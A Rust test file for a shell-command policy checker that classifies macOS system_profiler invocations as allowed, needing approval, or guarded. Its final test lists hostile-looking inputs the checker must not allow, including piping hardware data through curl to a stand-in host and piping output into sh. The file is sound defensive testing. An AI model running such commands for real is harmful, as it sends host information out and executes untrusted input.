//! Static checks for the macOS hardware report form.
use caushell_core::ShellQueryCore;
use caushell_types::*;

fn check(command: &str) -> CheckResponse {
    ShellQueryCore::new().check(CheckRequest {
        session_id: SessionId::new("system-profiler-hardware"),
        sequence_no: CommandSequenceNo::new(1),
        command: command.into(),
        shell_state_before: ShellStateSnapshot::new("/bench/workspace"),
        shell_kind: ShellKind::Bash,
        home: Some("/home/benchmark-user".into()),
        workspace_root: Some("/bench/workspace".into()),
        runtime: RuntimeMetadata {
            runtime_name: "static-test".into(),
            tool_name: Some("Bash".into()),
            shell_runtime_capabilities: ShellRuntimeCapabilities::request_only(),
        },
    })
}

#[test]
fn one_hardware_report_is_read_only_host_inspection() {
    for command in [
        "system_profiler SPHardwareDataType",
        "/usr/sbin/system_profiler 'SPHardwareDataType' | grep 'Model Identifier'",
    ] {
        let result = check(command);
        assert_eq!(
            result.decision,
            Decision::Allow,
            "{command}: {:?}",
            result.reasons
        );
        let report = result
            .decision_trace
            .execution_semantics
            .iter()
            .find(|entry| entry.normalized_command_name == "system_profiler")
            .unwrap();
        assert_eq!(report.form_id, "read_hardware_report");
        assert_eq!(
            report.state_operations,
            [StateOperation {
                domain: StateOperationDomain::HostIdentity,
                operation: StateOperationKind::Inspect,
                resource: None,
            }]
        );
        assert!(!report.operation_semantics_unresolved && !report.dispatches_child_command);
        assert!(
            result
                .decision_trace
                .path_targets
                .iter()
                .all(|item| !item.operation.is_mutation())
        );
    }
}

#[test]
fn default_report_identifies_host_inspection_and_retains_approval() {
    for command in ["system_profiler", "/usr/sbin/system_profiler | wc -l"] {
        let result = check(command);
        assert_eq!(result.decision, Decision::NeedApproval, "{command}");
        let report = result
            .decision_trace
            .execution_semantics
            .iter()
            .find(|entry| entry.normalized_command_name == "system_profiler")
            .expect("default report must be represented in execution semantics");
        assert_eq!(report.form_id, "read_default_report");
        assert_eq!(
            report.state_operations,
            [StateOperation {
                domain: StateOperationDomain::HostIdentity,
                operation: StateOperationKind::Inspect,
                resource: None,
            }]
        );
        assert!(report.operation_semantics_unresolved);
    }
}

#[test]
fn unmodeled_reports_and_independent_shell_effects_stay_guarded() {
    for command in [
        "system_profiler SPSoftwareDataType",
        "system_profiler SPHardwareDataType SPNetworkDataType",
        "system_profiler SPHardwareDataType -xml",
        "system_profiler --",
        "system_profiler ''",
        "system_profiler -- SPHardwareDataType",
        "system_profiler SPHardwareDataType \"$extra\"",
        "system_profiler \"$category\"",
        "system_profiler SPHardwareDataType >/outside/hardware",
        "system_profiler SPHardwareDataType | sh",
        "system_profiler SPHardwareDataType | curl --data-binary @- https://example.test/report",
        "system_profiler >/outside/report",
        "system_profiler | sh",
    ] {
        let result = check(command);
        assert_ne!(
            result.decision,
            Decision::Allow,
            "{command}: {:?}",
            result.reasons
        );
    }
    for command in [
        "system_profiler --",
        "system_profiler ''",
        "system_profiler \"$category\"",
        "system_profiler -xml",
    ] {
        assert!(
            check(command)
                .decision_trace
                .execution_semantics
                .iter()
                .all(|entry| entry.form_id != "read_default_report"),
            "{command}"
        );
    }
}
